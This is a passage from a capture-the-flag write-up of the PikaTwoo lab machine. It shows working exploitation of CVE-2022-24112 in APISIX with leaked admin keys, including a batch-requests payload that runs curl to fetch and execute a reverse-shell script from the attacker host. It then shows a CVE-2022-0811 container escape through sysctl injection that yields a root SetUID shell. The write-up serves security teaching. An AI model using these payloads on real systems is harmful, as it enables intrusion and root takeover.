J3ZnJXdU1uNVQ5OVVsb0xDb25xd3I1MzJoRm5VQXF2UjVkUXU1U1VseHdzM1orZnE3cGRmR0VqOVZJanRNdjhXUXk5aDFGbGVLSUw1VXl5aUdDZGcyY2JwUUtCckZaZDQzd2ZDSFpSVlRvT2NFY2t6MVdSUEFwcWlObCt4aFNRZXhJd2ZRUlhLWVVVNURxL2t0aGlVTExvWENabHB1UVlhc2d2dXBsM0ZvVUlycG5hYmxGQ1F0YzVCZDh4TGlQTGQzTUtyNzZXbDFrTFdqNlM3S2NBaWJmMEVhanVlOVpCY2tDTFdxanRIemh3czFSaVUwdE9IUSsxNmVGdmZ6QkJEQy8vTnVhYjRCZHd0a1Nic0Zkb25Dam5oVGxDbUtqdDhzQ3dqY0xmZlR2dEloUUd4V1VDSkVXaW5NVzI0VUlkVFozeW9MTXhGcFhuazlkeEJkSWh5QU41SVdNZlRBdWRMRXVqc2FsUGxyN21HdVZmV1JqUDlON0pDYmxyMTZFRWdWc2I1ZEpaUlp1MWxlSDJYYkhTckJ3RUdNRmp6SmVtQVZrb3krOWhvL3lLamhzYTl0WXlCdzZUMzl6YXh0bEFqdW56TWNGMDZGV2htVFcxSmtWZkJOYWFkRUw5cGI2cm5BZnptYllLakRQd2RvaXpsK3dwNjhDZEFweFFleFRpWWc3cmVYK20vT0MzS2JYc1Z2SHhmd1FNbXNCZmM2T0JhUFh3c25ZeWlxSW8xU3NhaFJSbGg4djAwUCtDbHRvVDdTTVBFTVNZSHRqWndCd29JbWNlTExRODRyTHdFUStRUnl4SXFiSENxNEFxR29za09NVzJVSk5RbjBvbkJXTjR0a3VBSmd3RG9tVkNlWEpxK2RDQXVmSUxwaGhEVndqUjU3dGtCQWFSU0JFQTJScThrWG9lQXU0QVlGVEJ3bGRzaEFRd2RyREFpSzJSekhoVXNpU0t0TFJFMkVlc2lRd0hnb0p2cUVPMXZhRERDQ0tmOVJBaHhKSkVsNWdPcGd0T3BSM0JjeDZmTGluT3BkSGZSNFBMelZmUm5KbmVraEwyNDQ4dU9PRFZ5aUwvRUdXNjFKcUNzTkR1Z0UwaG5CZXlvTWc2eEt4UUE2eU9QVVAzdEJEZHV5TmVQd2U2UHVYd2RwOStQYmVxS01pYjFRNUNSem5QUkFxSCtydmlHWWFhaW5VS2Fob2lJK28yNCtvMjQrbzI5ZkQ5SDZBRVNjT3ZUMmNlUE9Nem5EbURiNGJnUzBWejR1Vi9ZeGpQOWM5bER1djRsay9IUm5Gc2xFc3g4enZNRWFlVnkvaVFadEx0TUhsT3hIRHpETDV3bzdWalZteGNubHZNdUswTkExYTZ6Y2Uzc0NGMzdxWWgvTGhPZVJvRGNNUFR2ekJpVDg0OFhmblB4ekFoeU5DKytERSt6aHhza2g3ZURGNjVzZ24wT2tyMjhBRGRiQVZKa0w1WG02dDdVSE1yM081ZGVtUHhxMXQ1RGswRkp6emcxRi9NT29QUnYxR1JnMDlqeDJuM1BveW9hYnZUVmY3Q3pIbWhOUDZTTTZRMVVBNWg5UEpTTE5iZmRLSHplclFlY1c4THU1TzN4WUpaY3VNS1AxQ0MyUXRXZUFleHpFczhBeVZyVm5GT0tsVXEvYnNySHBlT1VIUXRxMWZyQm1xR21YenBGdzlRZGE1Y1FwbnA2V1RzNU16eTdDTlNzV2FuWjViWndZNmkwRTcyWmtlT3RmRGR6RlpkbVVSdFFJZjg3QkJDVWZQdXVzcnRRQkpKNWhnTjhobnRlMWd5ODF4N0FPNkNWajhZUmZPVlNpcFpFK1JGN0ptRk11bFlya0FIUThUbEEza2xDMGVBc2VKVCtEMnJFUDVnNDlZeGxtZnRaQnREbHZ3eGMwNHkyU2VtNmV4Qm5MelhONkd6QjMyR3VCTWtON0JnSFBUWnpaQmw5OHdaaFV3Z1JoNzhLbUpOaFpxQnJFVCtLaS84QkZiVU1ldWdiTnNCVXd3eDlDNVJBNE1lOHJwV3dQbGpkNDk1R05xNy96TUFoa2RvM1ZTemxiZ2x0ZWoxaEp0WWxHaTlXN3RVZVRGVGJ2VVB6dDRocXpRY2pZbjYvbW94Nm0zMVFsNjFvaEZYM1RYaGNUTytWSUF4eVlteDJ5Ujk2bGc1WlUrSFRFSElROVVTbGswWDFFbmNORWREVWdPRXJ1aStFRkc5QjhIekQrV3J2M2oyTFpPeWV4WXkyZmU3RFVqbXFwNm0xVllZQ3JvTzhENGlFbVJjWE5rLytjLzhXK0JIbzF0eGhFajh4cGlYa2d0dkJvbk1BTVdtdlM1Vmk0YW10cytYbkx3MzUvWjR2TVg4TGxnZmY0Q25vNEN3ckVEaUFVS0wrRHdJQWhwRVA4N3NLbDBaOHZCeEhIdk10YmlYemJrNkY5L0IycG5ERkdUb0w4L0hmMHpIcERhbkN3L3RPSmM5RTJPdDROUDd0a0dvV0FRek1QYUc5MG5ISEkwQ3h5R2VJNGJaVU1ZNlVXVmU0ai9aZjBwT1RKRzVRZGxEQjFuRHh0cXBHdDI5anBaUFdyZnllRUw2VEErMkI2Z0R4MEhTY29MUElHVFBlNURqdVp4UEkxU1VydlVjVENaUDhvYWg4ZzBCd3NaV1FKOVplUGVzbmx2MGQ1elhibTZGSk5ETmVrcFlkZTNTOU1tcWdiaE9MZVdKNE1tZkdSZnlvRExuclZBZGlDV3VqMG5OQ2x1UGlOTGhoMXRjV210OXo3eTNaenpRdTVFTDR1TjJiODgzTXorSGJaNSsxdnMzaVdkVzBuNnp4OUdRVXB3R2w4NDJxN0ZxVWNkT2c5L1JXRU5aUHRmVU1aRkQ1dU5rdUFwVFRLbE50cTdwN3ZsenhscitUVHdaQ3hXT2EwdXliTnV5WENmVHVUdGpJTnpqdzRTZ2plWE9qcktiQmw0SXVabllqRTlMQmwyclZJOEtaYlBDall5TVNTRmNxbmdwOGtxdVFMdTAxRkd4RDM2WFVVYUtkUlFqeWR6WUphUHZmandFWm8ycDE0eEsvSHNWd0g4Z05SWmg1SXVwWHd6L0R6NS9zaVFuOTBvRmI2KzJpSFFYN1Q3bmZwZGUzclp2SGhzYmM1Q3B1YUpkVlI1TlVmNUlPN0cwNGY3eTJuN0liZjVsVS96S0ZpR3pYYlJMSGZsNUVjbFNLa29zYUpIN2ZiRDN1NDc5YnZtYnpHQStCUW9idE5aUElKbXYzSFo2TjlPNncvdG5TdFkyYlY2b3ZIMHZqUDk5YnkzczNHSTJON212WDY5MjU5ZWRlL3ZwcjFPL2FGM2ZkL2ZDWXZRdmFBdTI3MTZyOS9zVHJ2Tnh2MmcyUjEvTDZDZCt5RnpIbjdTZHUzbi9RT3E5K3ZUeTNaM0o2d01remlXcVkzNzROM2V0NmEzelVIemRpZEFUR1k3cDFhL3ZiMGZUanYzbmVhMC90aS9ibmI2N1VhOTM3N3ZmUGZlMVM4SHpXNi8zV3RPRzdmdFpxYy9mZXplN3NhRXlDNlpYYjlpbm5UMHRuam12SVZxOS9yTnpsdEdWWktoNEtYWFFiYzc3WDY3ZnF2Ti9hSFo3UDUrTXo4dkhUTHpnOGVVenZzVndQRzhHN2VQa3NiNjk3ODJkMk9PbkZRMDlNTHluTDBKZEs5ZjcrK21QNExXYjRHMkU0NisvS1YvYkFmVkYwcmZ2VU5mOUlibFBOamw5NEZ0NU1FMmZodk1pbmZuOHY2dTN1NGN0S3dIOXAzdEZwSFYxckczejZ5M21iR1RheVRUbytIZVlIL1RnOXAyUW42RCtjM0JLN1RMK3BZcnBlMDFPKzJVMEJZSU9ud2hEZGJGVGJ0VXJnM3ZiTDhOci9LS3dlMzBqU2ErYlVQajZjRkd5ai93TXBWLzcyWEtOOGhKYnhXcmFZYTV1TDVLQXRuOHN0ZnFHTjFQc25FSGl0UlNOWHVrTHNiazJjdlVmemNjaU4xK2JMcEs0bGkzYkJVZ3A5ZU05aCtuV041UmUyUDJRaWZ0SW1nUGZjelJQYkV5Z24vK2dpWExzckU3blBxUm0rSzhoUVdZMXh6bkN3OStlTXcvUE9ZZkh2TURQT2F2MFJJbWN6OU5iUG1ncHc5NitxQ25INkVuenpZL2FPbURsajVvNlIxb0tRNW5keW5CblBvZmRQVkJWeDkwZFFCZEhYMDVpcUlIajJybEwwZUpkL0dvbG5Fakh2M24vd1VBQVAvL1VMRFU3M0RGQVFBPQ=="
      },
      "type": "helm.sh/release.v1"
    }
  ]
}

```

That has two interesting variables related to APISIX:

```

"APISIX_ADMIN_KEY": "YThjMmVmNWJjYzM3NmU5OTFhZjBiMjRkYTI5YzNhODc=",
"APISIX_VIEWER_KEY": "OTMzY2NjZmY4YjVkNDRmNTAyYTNmMGUwOTQ3NmIxMTg="

```

### APISIX RCE

#### Strategy

I noted [above](#apisix-vulns) a CVE in APISIX that this version would be vulnerable. It allowed bypassing of IP whitelisting, but also added that if the keys were left as default, it would give RCE. The keys were not left as default, but now that I’ve leaked them, it’s basically the same.

[CVE-2022-24112](https://apisix.apache.org/blog/2022/02/11/cve-2022-24112/) - An issue in the `X-REAL-IP` header that allows for bypassing IP restrictions, *and*, if the default Admin Key is present, the batch-requests plugin will allow for remote code execution. [This POC](https://github.com/twseptian/cve-2022-24112/tree/main) will exploit the vuln, but it doesn’t work here (likely because the default admin key was changed).

[This repo](https://github.com/twseptian/cve-2022-24112/tree/main) has a POC, but it’s really just making two HTTP requests to the APISIX admin API, so I’ll do it manually to understand what’s happening.

#### Find API

APISIX is running on TCP 443 over HTTPS. The first request goes to `/apisix/batch-requests`. If I `curl` this from my host, it returns no route found:

```

oxdf@hacky$ curl -k https://10.10.11.199/apisix/batch-requests
{"error_msg":"404 Route Not Found"}

```

It’s important to do this as a POST request:

```

oxdf@hacky$ curl -k -X POST https://10.10.11.199/apisix/batch-requests
{"error_msg":"no request body, you should give at least one pipeline setting"}

```

#### Add Route

I’m going to add a route to the API that gives me a reverse shell. I’m going to need to hit the above endpoint with the following:
- Header: `Content-type: application/json` - so that the body is correctly interpreted
- Body: The following JSON blob that describes a request that will be made:

  ```

  {
      "headers": {
          "X-API-KEY": "a8c2ef5bcc376e991af0b24da29c3a87"
      }, 
      "timeout": 1500, 
      "pipeline": [
          {
              "path": "/apisix/admin/routes/index", 
              "method": "PUT", 
              "body": "{\"uri\":\"/shell/0xdf\",\"upstream\":{\"type\":\"roundrobin\",\"nodes\":{\"127.0.0.1\":1}},\"name\":\"shell\",\"filter_func\":\"function(vars) os.execute(\\\"curl http://10.10.14.6/rev -o /tmp/0xdf; bash /tmp/0xdf\\\"); return true end\"}"
          }
      ]
  }

  ```

  This will cause APISIX’s admin feature to make a PUT request to `/apisix/admin/routes/index` to create a route at `/shell/0xdf`. That will execute `curl http://10.10.14.6/rev -o /tmp/0xdf; bash /tmp/0xdf`, which has `curl` to fetch a script named `rev` from my server and then run it with `bash`. I updated the `X-API-KEY` header with the leaked key.

All together, that `curl` command looks like (using `jq` to pretty print the JSON response):

```

oxdf@hacky$ curl -sk -H "Content-Type: application/json" -X POST "https://10.10.11.199/apisix/batch-requests" -d '{"headers": {"X-API-KEY": "a8c2ef5bcc376e991af0b24da29c3a87"}, "timeout": 1500, "pipeline": [{"path": "/apisix/admin/routes/index", "method": "PUT", "body": "{\"uri\":\"/shell/0xdf\",\"upstream\":{\"type\":\"roundrobin\",\"nodes\":{\"127.0.0.1\":1}},\"name\":\"shell\",\"filter_func\":\"function(vars) os.execute(\\\"curl http://10.10.14.6/rev -o /tmp/0xdf; bash /tmp/0xdf\\\"); return true end\"}"}]}' | jq .
[
  {
    "headers": {
      "Access-Control-Allow-Credentials": "true",
      "Server": "APISIX/2.10.1",
      "Content-Type": "application/json",
      "Transfer-Encoding": "chunked",
      "Access-Control-Expose-Headers": "*",
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Max-Age": "3600",
      "Connection": "close",
      "Date": "Wed, 30 Aug 2023 21:09:09 GMT"
    },
    "status": 200,
    "body": "{\"action\":\"set\",\"node\":{\"key\":\"\\/apisix\\/routes\\/index\",\"value\":{\"update_time\":1693429749,\"priority\":0,\"upstream\":{\"type\":\"roundrobin\",\"pass_host\":\"pass\",\"nodes\":{\"127.0.0.1\":1},\"hash_on\":\"vars\",\"scheme\":\"http\"},\"filter_func\":\"function(vars) os.execute(\\\"curl http:\\/\\/10.10.14.6\\/rev -o \\/tmp\\/0xdf; bash \\/tmp\\/0xdf\\\"); return true end\",\"status\":1,\"name\":\"shell\",\"id\":\"index\",\"uri\":\"\\/shell\\/0xdf\",\"create_time\":1693429744}}}\n",
    "reason": "OK"
  }
]

```

It reports success.

#### Shell

With that endpoint created, I’ll hit it to trigger the reverse shell:

```

oxdf@hacky$ curl -k https://10.10.11.199/shell/0xdf

```

It hangs, but there’s a request at my webserver:

```
10.10.11.199 - - [30/Aug/2023 17:10:12] "GET /rev HTTP/1.1" 200 -

```

And then a shell at `nc`:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.199 42778
bash: cannot set terminal process group (1): Not a tty
bash: no job control in this shell
bash-5.1$ id
uid=65534(nobody) gid=65534(nobody) groups=65534(nobody)
bash-5.1$ hostname
apisix-7dd469755b-qtzd7

```

This is the APISIX pod.

I’ll upgrade the shell:

```

bash-5.1$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
bash-5.1$ ^Z
[1]+  Stopped                 nc -lnvp 444
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 444
            reset
bash-5.1$ 

```

## Shell as Andrew

### Enumeration

This is another pod, and it’s very empty. I’ll try to find the APISIX configs. There’s nothing in `/etc/` of interest (including nginx and APISIX):

```

bash-5.1$ ls /etc/
alpine-release        issue                 profile
apk                   logrotate.d           profile.d
ca-certificates       modprobe.d            protocols
ca-certificates.conf  modules               resolv.conf
conf.d                modules-load.d        securetty
crontabs              motd                  services
fstab                 mtab                  shadow
group                 network               shells
hostname              openldap              ssl
hosts                 opt                   sysctl.conf
init.d                os-release            sysctl.d
inittab               passwd                terminfo
inputrc               periodic              udhcpd.conf

```

The docs show APISIX uses a `config.yaml` file. There’s on in `/usr/local/apisix/conf/`:

```

bash-5.1$ find . -name config.yaml 2>/dev/null
./usr/local/apisix/conf/config.yaml

```

The file has a lot of information in it, but one part jumps out:

```

discovery:
  eureka:
    fetch_interval: 30
    host:
    - http://andrew:st41rw4y2h34v3n@evolution.pokatmon.htb:8888
    prefix: /eureka/
    timeout:
      connect: 2000
      read: 5000
      send: 2000
    weight: 100

```

There’s a password for andrew in that URL, as well as a new domain.

I’m not able to find anything that resolves to `evolution.pokatmon.htb` in any of the containers or see anything different from my VM.

### SSH

That password does work for the andrew user on PikaTwoo:

```

oxdf@hacky$ sshpass -p 'st41rw4y2h34v3n' ssh andrew@10.10.11.199
Linux pikatwoo.pokatmon.htb 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64
...[snip]...
andrew@pikatwoo:~$ 

```

And I finally get `user.txt`:

```

andrew@pikatwoo:~$ cat user.txt
42845633************************

```

## Shell as root

### Enumeration

#### Home Directories

andrew’s home directory is relatively empty:

```

andrew@pikatwoo:~$ ls -la
total 28
drwxr-xr-x 3 root   andrew 4096 Nov 10  2022 .
drwxr-xr-x 4 root   root   4096 Nov  8  2022 ..
lrwxrwxrwx 1 root   root      9 Mar 30  2022 .bash_history -> /dev/null
-rw-r--r-- 1 andrew andrew  220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 andrew andrew 3526 Apr 18  2019 .bashrc
drwxr-xr-x 2 andrew users  4096 Nov 10  2022 Documents
-rw-r--r-- 1 andrew andrew  807 Apr 18  2019 .profile
-rw-r----- 1 root   andrew   33 Aug 25 21:27 user.txt

```

There’s one other user, jennifer, and their home directory is listable:

```

andrew@pikatwoo:/home$ ls
andrew  jennifer
andrew@pikatwoo:/home$ ls -la jennifer/
total 44
drwxr-xr-x  7 root     jennifer 4096 Jan 17  2023 .
drwxr-xr-x  4 root     root     4096 Nov  8  2022 ..
lrwxrwxrwx  1 root     root        9 Mar 31  2022 .bash_history -> /dev/null
-rw-r-----  1 root     jennifer  220 Mar 10  2022 .bash_logout
-rw-r-----  1 root     jennifer 3526 Mar 10  2022 .bashrc
drwxr-x---  2 root     jennifer 4096 Mar 10  2022 .cache
drwxr-x---  3 root     jennifer 4096 Mar 10  2022 .config
drwxr-x---  2 jennifer jennifer 4096 Mar 31  2022 Documents
drwxr-x---  3 root     users    4096 Mar 18  2022 .kube
drwxr-x--- 10 root     users    4096 Mar 18  2022 .minikube
-rw-r-----  1 root     jennifer  807 Mar 10  2022 .profile
-rwxr-x---  1 root     users     145 Jan 17  2023 template.yaml

```

`template.yaml`, as well as the `.kube` and `.minikube` directories are part of the users group, of which andrew is a member:

```

andrew@pikatwoo:~$ id
uid=1001(andrew) gid=1001(andrew) groups=1001(andrew),100(users)

```

The template file gives the name of a container that presumably exists on PikaTwoo (since it won’t be able to reach the internet to download others):

```

apiVersion: v1
kind: Pod
metadata:
  name: template-pod
spec:
  containers:
  - name: alpine
    image: alpine:latest
    imagePullPolicy: Never

```

I’ll keep in mind to use `alpine:latest` when creating containers later.

#### Kubernetes API

`kubectl` is installed on the host for managing Kubernetes. andrew isn’t able to interact with it:

```

andrew@pikatwoo:~$ kubectl get pods
Error from server: the server responded with the status code 412 but did not return more information

```

But using jennifer’s config works, kind of:

```

andrew@pikatwoo:~$ kubectl --kubeconfig /home/jennifer/.kube/config get pods
Error from server (Forbidden): pods is forbidden: User "jennifer" cannot list resource "pods" in API group "" in the namespace "default"

```

I’m able to interact with the Kubernetes API, but only to learn that jennifer doesn’t have permissions to list pods in default. I’ll try the namespace from the pokatdex-api pod, applications, but same thing:

```

andrew@pikatwoo:~$ kubectl --kubeconfig /home/jennifer/.kube/config --namespace applications get pods
Error from server (Forbidden): pods is forbidden: User "jennifer" cannot list resource "pods" in API group "" in the namespace "applications"

```

jennifer does have the ability to list the namespaces:

```

andrew@pikatwoo:~$ kubectl --kubeconfig /home/jennifer/.kube/config --namespace applications get namespaces
NAME              STATUS   AGE
applications      Active   531d
default           Active   531d
development       Active   293d
kube-node-lease   Active   531d
kube-public       Active   531d
kube-system       Active   531d

```

jennifer is not able to list pods in any of those either:

```

andrew@pikatwoo:~$ kubectl --kubeconfig /home/jennifer/.kube/config --namespace development get pods
Error from server (Forbidden): pods is forbidden: User "jennifer" cannot list resource "pods" in API group "" in the namespace "development"
andrew@pikatwoo:~$ kubectl --kubeconfig /home/jennifer/.kube/config --namespace kube-node-lease get pods
Error from server (Forbidden): pods is forbidden: User "jennifer" cannot list resource "pods" in API group "" in the namespace "kube-node-lease"
andrew@pikatwoo:~$ kubectl --kubeconfig /home/jennifer/.kube/config --namespace kube-public get pods
Error from server (Forbidden): pods is forbidden: User "jennifer" cannot list resource "pods" in API group "" in the namespace "kube-public"
andrew@pikatwoo:~$ kubectl --kubeconfig /home/jennifer/.kube/config --namespace kube-system get pods
Error from server (Forbidden): pods is forbidden: User "jennifer" cannot list resource "pods" in API group "" in the namespace "kube-system"

```

#### Minikube Server

Looking at jennifer’s Kubernetes config, it is looking for a minikube server at 192.168.49.2:

```

apiVersion: v1
clusters:
- cluster:
    certificate-authority: /home/jennifer/.minikube/ca.crt
    extensions:
    - extension:
        last-update: Fri, 18 Mar 2022 10:23:04 GMT
        provider: minikube.sigs.k8s.io
        version: v1.25.2
      name: cluster_info
    server: https://192.168.49.2:8443
  name: minikube
contexts:
- context:
    cluster: minikube
    user: jennifer
  name: jennifer-context
current-context: jennifer-context
kind: Config
preferences: {}
users:
- name: jennifer
  user:
    client-certificate: /home/jennifer/.minikube/profiles/minikube/jennifer.crt
    client-key: /home/jennifer/.minikube/profiles/minikube/jennifer.key

```

That’s not this host, but this host does have the .1 IP for that network on it’s `cni-podman0` adapter:

```

andrew@pikatwoo:/home/jennifer/.kube$ ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:d0:f3 brd ff:ff:ff:ff:ff:ff
    altname enp11s0
    altname ens192
    inet 10.10.11.199/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:d0f3/64 scope global dynamic mngtmpaddr 
       valid_lft 86400sec preferred_lft 14400sec
    inet6 fe80::250:56ff:feb9:d0f3/64 scope link 
       valid_lft forever preferred_lft forever
3: cni-podman0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether a6:9b:3a:63:07:c3 brd ff:ff:ff:ff:ff:ff
    inet 192.168.49.1/24 brd 192.168.49.255 scope global cni-podman0
       valid_lft forever preferred_lft forever
    inet6 fe80::a49b:3aff:fe63:7c3/64 scope link 
       valid_lft forever preferred_lft forever
4: vethb5c6d31e@if3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master cni-podman0 state UP group default 
    link/ether 66:8e:c1:e6:ed:52 brd ff:ff:ff:ff:ff:ff link-netns cni-4b6c723d-bdcc-8dd3-7928-5084ec345fbd
    inet6 fe80::24a1:5ff:fefd:539d/64 scope link 
       valid_lft forever preferred_lft forever

```

[Podman](https://podman.io/) is an open source alternative to Docker for running containers.

### Identify cr8escape

#### Identifying Vulnerability

[minikube](https://minikube.sigs.k8s.io/docs/) is the software running Kubernetes on this host. It’s running version 1.28.0-0:

```

andrew@pikatwoo:~$ dpkg -l | grep minikube
hi  minikube                                         1.28.0-0                          amd64        Minikube

```

Some searching for minikube vulnerabilities turns up a post from Crowdstrike, [cr8escape: New Vulnerability in CRI-O Container Engine Discovered by CrowdStrike (CVE-2022-0811)](https://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/). It says:

> Kubernetes uses a [container runtime](https://kubernetes.io/docs/setup/production-environment/container-runtimes/) like CRI-O or Docker to safely share each node’s kernel and resources with the various containerized applications running on it. The Linux kernel accepts runtime parameters that control its behavior. Some parameters are namespaced and can therefore be set in a single container without impacting the system at large. Kubernetes and the container runtimes it drives allow pods to update these “safe” kernel settings while blocking access to others.
>
> CrowdStrike’s Cloud Threat Research team discovered a flaw introduced in CRI-O version [1.19](https://github.com/cri-o/cri-o/tree/v1.19.0/pinns/src) that allows an attacker to bypass these safeguards and set arbitrary kernel parameters on the host. As a result of CVE-2022-0811, anyone with rights to deploy a pod on a Kubernetes cluster that uses the CRI-O runtime can abuse the “[kernel.core\_pattern](https://man7.org/linux/man-pages/man5/core.5.html)” parameter to achieve container escape and arbitrary code execution as root on any node in the cluster.

The NIST page on the CVE has the exact versions that are vulnerable:

![image-20230830210449418](/img/image-20230830210449418.png)

So how to check if it’s using CRI-O and what version? I’ll `grep` through jennifer’s home directory for `cri-o`:

```

andrew@pikatwoo:/home/jennifer$ grep -ir cri-o . 2>/dev/null
./.minikube/logs/lastStart.txt:I0318 10:22:24.318492     443 preload.go:148] Found local preload: /root/.minikube/cache/preloaded-tarball/preloaded-images-k8s-v17-v1.23.3-cri-o-overlay-amd64.tar.lz4
./.minikube/logs/lastStart.txt:I0318 10:22:24.318770     443 preload.go:174] Found /root/.minikube/cache/preloaded-tarball/preloaded-images-k8s-v17-v1.23.3-cri-o-overlay-amd64.tar.lz4 in cache, skipping download
./.minikube/logs/lastStart.txt:RuntimeName:  cri-o
./.minikube/logs/lastStart.txt:I0318 10:22:33.615621     443 out.go:176] * Preparing Kubernetes v1.23.3 on CRI-O 1.22.1 ...
./.minikube/logs/lastStart.txt:I0318 10:22:34.100346     443 crio.go:491] all images are preloaded for cri-o runtime.
./.minikube/logs/lastStart.txt:I0318 10:22:34.137911     443 crio.go:491] all images are preloaded for cri-o runtime.
./.minikube/profiles/minikube/events.json:{"specversion":"1.0","id":"df4c253d-79e0-4fbc-a5d4-b2c9f4651f6f","source":"https://minikube.sigs.k8s.io/","type":"io.k8s.sigs.minikube.step","datacontenttype":"application/json","data":{"currentstep":"11","message":"* Preparing Kubernetes v1.23.3 on CRI-O 1.22.1 ...","name":"Preparing Kubernetes","totalsteps":"19"}}

```

The last line gives the CRI-O version of 1.22.1, which should be vulnerable according to that NIST chart.

#### Cr8Escape Background

I’ve actually exploited this vulnerability before in [Vessel](/2023/03/25/htb-vessel.html#shell-as-root), although it wasn’t in the context of Kubernetes. The issue is that Kubernetes and CRI-O let a container set arbitrary kernel options using the `+` delimiter. Once something can do that, there are ways to leverage that to get execution as root. In this example (and Vessel’s), I’ll set the path to the script that will run (as root) on a crashdump to something I control, and then crash a process.

In Vessel, this was accompished via a SetGID `pinns` binary. In PikaTwoo, it’s via Kubernetes. Kubernetes only allows for some safe kernel options to be set via the config YAML file. It takes the value from that file and passes it to `pinns` to set the options. Unfortunately, it doesn’t sanitize the `+` character, which is similar to what `&` does in a HTTP request.

To exploit this, I’ll set a safe / allowed option to `[dummy value]+[unsafe option]=[value]`. This will inject the setting of `[unsafe option]`, even though I’m not supposed to be allowed to set that.

### Cr8Escape POC

#### Strategy

The CrowdStrike post gives the steps to reproduce this vulnerability, but it’s much more complicated than what is necessary here. In the post, it’s designed for a scenario where I have access to create pods, but not to the host file system (for example, AWS’s EKS Kubernetes service). In this scenario, the steps to exploit are:
- Create a pod and put a malicious script in it.
- Create a second pod that exploits the process by injecting kernel options to set the malicious script to be run on a crash. To do this, I’ll need to figure out the path in OverlayFS.
- Go into the first pod and crash a process, triggering the script from the host.

In this scenario, I’ll do the same thing, but I don’t need the first pod. I can:
- Create a script anywhere on the host.
- Create a pod to set the kernel option.
- Trigger the crash from the host.

This is very similar to what I did on [Vessel](/2023/03/25/htb-vessel.html#cve-2022-0811), though through Kubernetes this time.

If I didn’t have access to the host filesystem for some reason, I could set up my own local instance of Minikube to look like this one by [installing Minikube](https://minikube.sigs.k8s.io/docs/start/), and then starting with [these instructions](https://minikube.sigs.k8s.io/docs/drivers/podman/) like `minikube start --driver=podman --container-runtime=cri-o`. This creates a Minikube controller in a Podman container like in PikaTwoo.

#### Create Script

I’ll put a simple script in a writable location like `/home/andrew/Documents/` and make it executable:

```

andrew@pikatwoo:~/Documents$ vim.tiny 0xdf.sh
andrew@pikatwoo:~/Documents$ chmod +x 0xdf.sh 
andrew@pikatwoo:~/Documents$ cat 0xdf.sh
#!/bin/bash

touch /tmp/0xdf

```

This script will touch the file `/tmp/0xdf`.

#### Modify Kernel Options

I’ll use the exploit template from the Crowdstrike blog post to make a container:

```

apiVersion: v1                          
kind: Pod  
metadata:
  name: sysctl-set
spec:                                         
  securityContext:           
   sysctls:
   - name: kernel.shm_rmid_forced
     value: "1+kernel.core_pattern=|/home/andrew/Documents/0xdf.sh #"
  containers:
  - name: alpine
    image: alpine:latest
    command: ["tail", "-f", "/dev/null"]

```

This will inject the `kernel.core_pattern` option to point at my script.

Trying to create the pod is met with another lack of permissions error:

```

andrew@pikatwoo:~/Documents$ kubectl --kubeconfig /home/jennifer/.kube/config create -f sysctl-set.yaml 
Error from server (Forbidden): error when creating "sysctl-set.yaml": pods is forbidden: User "jennifer" cannot create resource "pods" in API group "" in the namespace "default"

```

I’ll try in different namespaces. It also fails in applications, but in development it works!

```

andrew@pikatwoo:~/Documents$ kubectl --kubeconfig /home/jennifer/.kube/config create -f sysctl-set.yaml -n applications
Error from server (Forbidden): error when creating "sysctl-set.yaml": pods is forbidden: User "jennifer" cannot create resource "pods" in API group "" in the namespace "applications"
andrew@pikatwoo:~/Documents$ kubectl --kubeconfig /home/jennifer/.kube/config create -f sysctl-set.yaml -n development
pod/sysctl-set created

```

I can check now that the kernel option is set:

```

andrew@pikatwoo:~/Documents$ cat /proc/sys/kernel/core_pattern
|/home/andrew/Documents/0xdf.sh #'

```

#### Trigger Exploit

I’ll start a process that runs in the background:

```

andrew@pikatwoo:~/Documents$ tail -f /dev/null &
[1] 19090

```

`tail -f /dev/null` will continue to try to read from nothing indefinitely. Because it’s in the background (`&`), it gives the pid of that process.

I’ll enable crashdumps:

```

andrew@pikatwoo:~/Documents$ ulimit -c
0
andrew@pikatwoo:~/Documents$ ulimit -c unlimited
andrew@pikatwoo:~/Documents$ ulimit -c
unlimited

```

I’ll kill my process, creating a crashdump and triggering my exploit, creating the file in `/tmp`:

```

andrew@pikatwoo:~/Documents$ kill -SIGSEGV 19090
[1]+  Segmentation fault      (core dumped) tail -f /dev/null
andrew@pikatwoo:~/Documents$ ls -l /tmp/
total 0
-rw-r--r-- 1 root root 0 Sep  5 19:26 0xdf

```

### Shell

To get a shell, I’ll simply update `0xdf.sh` to create a SetUID/SetGID copy of `bash`:

```

#!/bin/bash

cp /bin/bash /tmp/0xdf-bash
chmod 6777 /tmp/0xdf-bash

```

Now I crash another process:

```

andrew@pikatwoo:~/Documents$ tail -f /dev/null &
[1] 54964
andrew@pikatwoo:~/Documents$ kill -SIGSEGV 54964

```

And start my shell:

```

andrew@pikatwoo:~/Documents$ /tmp/0xdf-bash -p
0xdf-bash-5.1#

```

I’m able to read the flag:

```

0xdf-bash-5.1# cat /root/root.txt
0f945ad0************************

```